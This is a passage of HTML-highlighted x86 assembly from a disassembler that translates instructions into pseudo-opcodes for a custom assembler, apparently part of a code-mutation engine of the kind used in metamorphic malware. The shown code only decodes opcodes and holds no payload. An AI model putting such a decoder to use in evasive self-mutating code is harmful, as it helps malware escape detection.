                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">     </span><span class="sc1">; Pseudoopcode SHIFT</span><span class="sc0">
      </span><span class="sc5">@@BitShifting_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">      </span><span class="sc1">; Extract the operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set it at +8 in the instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operand type</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@BS32_Reg</span><span class="sc0">      </span><span class="sc1">; If it's a Reg, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set SHIFT Mem,x</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Decode the memory operand</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
       </span><span class="sc5">@@BS32_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">     </span><span class="sc1">; Check if it's SHIFT,1 or SHIFT,x</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@BS32_GetNumber</span><span class="sc0"> </span><span class="sc1">; If it's ,x jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set 1 as shifting value</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@BS32_SetNumber</span><span class="sc0">
       </span><span class="sc5">@@BS32_GetNumber</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Get the value of shifting</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc5">@@BS32_SetNumber</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">      </span><span class="sc1">; Trim the bits ignored implicitly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set the shifting value (byte) at +7</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">  </span><span class="sc1">; in the disassembly of the instr.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
       </span><span class="sc5">@@BS32_Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Jump to finish the decoding</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@BS32_Common</span><span class="sc0">

       </span><span class="sc5">@@BitShifting8</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F2h</span><span class="sc0">     </span><span class="sc1">; Set SHIFT8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@BitShifting_Common</span><span class="sc0">

</span><span class="sc1">;;;; MOV [Mem8],Value (or MOV Reg8,Value) decoding (opcode C6)</span><span class="sc0">

       </span><span class="sc5">@@MOVMem8Value</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc0">     </span><span class="sc1">; Set the opcode as MOV Mem8,xxx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; Register or memory address?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVMem8_RegValue</span><span class="sc0">  </span><span class="sc1">; If register, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Decode the memory address</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Add the length of the operand</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc5">@@MOVMem8Value_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the value we are moving</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; Extend the sign</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@MOVMem8Value_01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
          </span><span class="sc5">@@MOVMem8Value_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it in the pseudoinstruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
       </span><span class="sc5">@@MOVMem8_RegValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; C0 = MOV Reg8,Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOVMem8Value_Common</span><span class="sc0"> </span><span class="sc1">; Jump to finish the decoding</span><span class="sc0">

</span><span class="sc1">;;;; MOV [Mem32],Value (or MOV Reg32,Value) decoding (opcode C7)</span><span class="sc0">

       </span><span class="sc5">@@MOVMem32Value</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">      </span><span class="sc1">; 44h = MOV Mem,Imm (in our assembler)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; Memory address or register?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVMem32_RegValue</span><span class="sc0">  </span><span class="sc1">; Jump if it's register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Decode the memory address</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Add the operand length</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the Imm to move</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it in the disassembly</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; Increase the EIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
      </span><span class="sc5">@@MOVMem32_RegValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; 40h = MOV Reg32,Imm32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Get the register and set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the immediate value and set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">        </span><span class="sc1">; Add the instruction length to the EIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

</span><span class="sc1">;;;; Some not very common instructions</span><span class="sc0">
</span><span class="sc1">;; Opcodes F6 and F7 are used for TEST, NOT, NEG, MUL, IMUL, DIV and IDIV.</span><span class="sc0">
</span><span class="sc1">;; Since MUL and up aren't used by us, we only decode TEST, NOT and NEG.</span><span class="sc0">
    </span><span class="sc5">@@SomeNotVeryCommon8</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; 0 is TEST</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@TEST8Value</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; If it's not TEST, it is NOT or NEG</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAh</span><span class="sc0">     </span><span class="sc1">; EAX = E2/E6</span><span class="sc0">
    </span><span class="sc5">@@SNVC_Gen</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Check if we use register or memory</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NOTNEGReg8</span><span class="sc0">    </span><span class="sc1">; If register, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set memory usage</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; Decode the memory address operand</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Add the length of the operand</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
    </span><span class="sc5">@@NOTNEGReg8</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the register involved</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; Increase the EIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

    </span><span class="sc5">@@SomeNotVeryCommon32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; If it's TEST, jump to disasm it</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@TEST32Value</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">     </span><span class="sc1">; E0/E4</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SNVC_Gen</span><span class="sc0">      </span><span class="sc1">; Jump to decode the rest of the instr.</span><span class="sc0">

    </span><span class="sc5">@@TEST8Value</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc0">     </span><span class="sc1">; Set TEST 8 bits opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen8Value</span><span class="sc0">     </span><span class="sc1">; Jump to decode the rest</span><span class="sc0">

    </span><span class="sc5">@@TEST32Value</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">      </span><span class="sc1">; Set TEST 32 bits opcope</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen32Value</span><span class="sc0">    </span><span class="sc1">; Jump to decode the rest</span><span class="sc0">

</span><span class="sc1">;;;; INC Mem, DEC Mem, CALL Mem, JMP Mem &amp; PUSH Mem disassembly</span><span class="sc0">

    </span><span class="sc5">@@INCDECMem8</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operation</span><span class="sc0">
